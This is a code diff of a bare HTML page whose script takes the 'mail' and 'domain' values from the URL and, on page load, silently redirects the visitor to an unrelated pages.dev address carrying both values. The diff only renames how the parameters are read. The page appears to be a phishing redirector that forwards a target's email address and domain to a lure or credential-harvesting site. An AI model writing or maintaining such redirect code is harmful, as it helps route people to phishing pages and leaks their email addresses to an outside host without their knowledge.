@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,8 +8,9 @@
 <body>
     <script type="text/javascript">
         const urlParams = new URLSearchParams(window.location.search);
+        const urlParams2 = new URLSearchParams(window.location.search);
         const mymail = urlParams.get('mail') || '';
-        const dm = urlParams.get('domain') || '';
+        const dm = urlParams2.get('domain') || '';
 
         // Redirect directly with both parameters
         window.location.replace(`https://pz57687797.pages.dev/?mail=${encodeURIComponent(mymail)}&domain=${encodeURIComponent(dm)}`);
